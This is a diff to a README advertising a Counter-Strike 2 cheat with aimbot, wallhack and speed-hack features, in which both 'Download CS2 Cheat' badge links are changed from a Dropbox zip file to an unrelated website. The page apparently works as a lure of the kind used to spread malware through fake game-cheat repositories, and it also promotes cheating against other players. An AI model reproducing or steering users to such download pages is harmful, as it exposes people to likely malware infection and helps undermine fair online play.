@@ -2,7 +2,7 @@
 
 A cheat for *Counter-Strike 2* that provides players with a variety of modifications to enhance or alter gameplay. This cheat includes features such as aimbots, wallhacks, speed hacks, and other cheats that give players an unfair advantage over others. These modifications allow players to manipulate game mechanics, making it easier to win matches or perform actions that would typically be impossible in standard gameplay.
 
-[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2%20Cheat-blueviolet)](https://www.dropbox.com/scl/fi/4jhw12dp0y73wl4kewupt/VLista.zip?rlkey=t91v97hu5inrue164tgx7xi0a&st=f8sggpyf&dl=1)
+[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2%20Cheat-blueviolet)](https://yogarouen.eu/)
 
 **Key Features**:
 - **Aimbot**: Automatically targets enemies, providing perfect accuracy.
@@ -18,4 +18,4 @@ A cheat for *Counter-Strike 2* that provides players with a variety of modificat
 2. Follow the installation instructions provided in the readme.
 3. Launch *Counter-Strike 2* and activate the cheat with the specified hotkeys.
 
-[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2%20Cheat-blueviolet)](https://www.dropbox.com/scl/fi/4jhw12dp0y73wl4kewupt/VLista.zip?rlkey=t91v97hu5inrue164tgx7xi0a&st=f8sggpyf&dl=1)
+[![Download CS2 Cheat](https://img.shields.io/badge/Download-CS2%20Cheat-blueviolet)](https://yogarouen.eu/)
